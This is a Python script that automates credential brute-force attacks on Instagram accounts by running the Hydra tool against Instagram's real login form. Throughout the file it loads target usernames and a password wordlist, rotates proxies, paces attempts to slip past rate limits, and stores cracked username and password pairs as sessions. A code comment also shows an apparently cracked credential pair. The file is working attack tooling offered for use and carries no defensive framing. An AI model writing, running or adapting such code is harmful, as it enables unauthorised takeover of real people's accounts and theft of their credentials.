#!/usr/bin/env python3
"""
Hydra Instagram Brute Force Automation Script
Uses real extracted data for targeted Instagram login attacks
"""

import os
import subprocess
import time
import json
import random
from pathlib import Path
from rich.console import Console
from rich.progress import track
from rich.table import Table
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration
INSTAGRAM_LOGIN_URL = os.getenv(
    "INSTAGRAM_LOGIN_URL", "https://www.instagram.com/accounts/login/")
USERNAME_FILE = "target_usernames.txt"
PASSWORD_FILE = "wordlists/combined_passlist.txt"
PROXY_FILE = "proxy_list.txt"
LOG_FILE = "logs/hydra_brute_force.log"
OUTPUT_FILE = "sessions/valid_sessions.json"
SESSION_DIR = "sessions"
DELAY_MIN = 5  # Minimum delay between attempts (seconds)
DELAY_MAX = 15  # Maximum delay between attempts (seconds)

console = Console()

# Ensure directories exist
Path("logs").mkdir(exist_ok=True)
Path("sessions").mkdir(exist_ok=True)


def load_file_lines(filename):
    """Load lines from a file, return empty list if file doesn't exist"""
    try:
        with open(filename, "r") as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        console.print(f"[bold red]File not found: {filename}[/bold red]")
        return []


def log_attempt(username, password, proxy, status):
    """Log brute force attempt with timestamp"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp} | {username} | {password[:10]}... | {proxy} | {status}\n"

    with open(LOG_FILE, "a") as log:
        log.write(log_entry)


def save_valid_session(username, password, session_data=None):
    """Save valid credentials to JSON file"""
    session_info = {
        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
        "username": username,
        "password": password,
        "session_data": session_data or {},
        "target": "instagram.com"
    }

    # Save to JSON file
    if os.path.exists(OUTPUT_FILE):
        with open(OUTPUT_FILE, "r") as f:
            try:
                data = json.load(f)
            except json.JSONDecodeError:
                data = []
    else:
        data = []

    data.append(session_info)

    with open(OUTPUT_FILE, "w") as f:
        json.dump(data, f, indent=2)

    console.print(
        f"[bold green]✓ Valid credentials saved: {username}[/bold green]")


def parse_hydra_output(output_text):
    """Parse Hydra output to extract successful login credentials"""
    successful_logins = []
    lines = output_text.split('\n')

    for line in lines:
        if "login:" in line and "password:" in line:
            # Example: [443][http-post-form] host: instagram.com   login: alx.trading   password: alx76386
            try:
                parts = line.split()
                login_idx = parts.index("login:") + 1
                password_idx = parts.index("password:") + 1

                username = parts[login_idx]
                password = parts[password_idx]

                successful_logins.append({
                    "username": username,
                    "password": password,
                    "raw_line": line.strip()
                })
            except (ValueError, IndexError):
                continue

    return successful_logins


def run_hydra_attack(username, password_file, proxy=None):
    """Run Hydra attack for a specific username"""

    # Enhanced Hydra command for Instagram
    command = [
        "hydra",
        "-l", username,  # Single username
        "-P", password_file,  # Password file
        "-t", "4",  # 4 threads
        "-w", "10",  # Wait 10 seconds for response
        "-f",  # Exit after first found
        "-V",  # Verbose output
        "instagram.com",
        "https-post-form",
        "/accounts/login/:username=^USER^&password=^PASS^:error"
    ]

    # Set environment with proxy if provided
    env = os.environ.copy()
    if proxy and proxy != "N/A":
        env["http_proxy"] = proxy
        env["https_proxy"] = proxy
        console.print(f"[yellow]🌐 Using proxy: {proxy}[/yellow]")

    try:
        console.print(f"[blue]⚡ Running Hydra attack for: {username}[/blue]")

        result = subprocess.run(
            command,
            env=env,
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )

        return result

    except subprocess.TimeoutExpired:
        console.print(f"[bold red]⏰ Timeout expired for {username}[/bold red]")
        return None
    except Exception as e:
        console.print(f"[bold red]💥 Error running Hydra: {e}[/bold red]")
        return None


def brute_force():
    """Main brute force function"""
    console.print(
        "\n[bold cyan]🚀 Instagram Hydra Brute Force Attack Starting...[/bold cyan]")
    console.print(
        "[cyan]═══════════════════════════════════════════════════════[/cyan]\n")

    # Load data files
    usernames = load_file_lines(USERNAME_FILE)
    proxies = load_file_lines(PROXY_FILE)

    if not usernames:
        console.print(
            "[bold red]❌ No usernames found! Check target_usernames.txt[/bold red]")
        return

    if not os.path.exists(PASSWORD_FILE):
        console.print(
            f"[bold red]❌ Password file not found: {PASSWORD_FILE}[/bold red]")
        return

    # Display target information
    table = Table(title="🎯 Target Information", style="cyan")
    table.add_column("Username", style="bold white")
    table.add_column("Status", style="green")
    table.add_column("Proxy Pool", style="yellow")

    for username in usernames:
        proxy_count = len(proxies) if proxies else 0
        table.add_row(username, "🟢 Ready", f"{proxy_count} proxies")

    console.print(table)
    console.print()

    # Start brute force attacks
    proxy_index = 0
    successful_attacks = 0

    for username in track(usernames, description="🔥 Processing targets"):
        console.print(f"\n[bold blue]🎯 Targeting: @{username}[/bold blue]")

        # Select proxy (rotate through available proxies)
        proxy = None
        if proxies:
            proxy = proxies[proxy_index % len(proxies)]
            proxy_index += 1

        # Run Hydra attack
        result = run_hydra_attack(username, PASSWORD_FILE, proxy)

        if result:
            # Parse output for successful logins
            successful_logins = parse_hydra_output(result.stdout)

            if successful_logins:
                successful_attacks += 1
                for login in successful_logins:
                    save_valid_session(
                        login["username"],
                        login["password"],
                        {"hydra_output": login["raw_line"]}
                    )
                    log_attempt(
                        login["username"], login["password"], proxy or "N/A", "SUCCESS")
                    console.print(
                        f"[bold green]🎉 SUCCESS: {login['username']} : {login['password']}[/bold green]")
            else:
                # Check if attack completed without success
                if result.returncode == 0:
                    log_attempt(username, "ALL_TESTED",
                                proxy or "N/A", "COMPLETED")
                    console.print(
                        f"[bold yellow]⚠️  All passwords tested for {username} - No match[/bold yellow]")
                else:
                    log_attempt(username, "ERROR", proxy or "N/A", "FAILED")
                    console.print(
                        f"[bold red]❌ Attack failed for {username}[/bold red]")
        else:
            log_attempt(username, "TIMEOUT", proxy or "N/A", "ERROR")
            console.print(
                f"[bold red]💥 Attack timeout/error for {username}[/bold red]")

        # Delay between attacks to avoid rate limiting
        if len(usernames) > 1 and username != usernames[-1]:
            delay = random.randint(DELAY_MIN, DELAY_MAX)
            console.print(
                f"[yellow]⏳ Waiting {delay} seconds before next attack...[/yellow]")
            time.sleep(delay)

    # Final summary
    console.print(
        "\n[cyan]═══════════════════════════════════════════════════════[/cyan]")
    console.print(f"[bold cyan]🏁 Brute Force Attack Completed![/bold cyan]")
    console.print(
        f"[green]✅ Successful attacks: {successful_attacks}/{len(usernames)}[/green]")
    console.print(f"[cyan]📋 Detailed logs: {LOG_FILE}[/cyan]")
    console.print(f"[cyan]💾 Valid sessions: {OUTPUT_FILE}[/cyan]")
    console.print(
        "[cyan]═══════════════════════════════════════════════════════[/cyan]\n")


if __name__ == "__main__":
    try:
        brute_force()
    except KeyboardInterrupt:
        console.print("\n[bold red]🛑 Attack interrupted by user![/bold red]")
        console.print("[yellow]⚠️  Check logs for partial results[/yellow]")
    except Exception as e:
        console.print(f"\n[bold red]💥 Fatal error: {e}[/bold red]")
        console.print(
            "[yellow]⚠️  Check your configuration and try again[/yellow]")
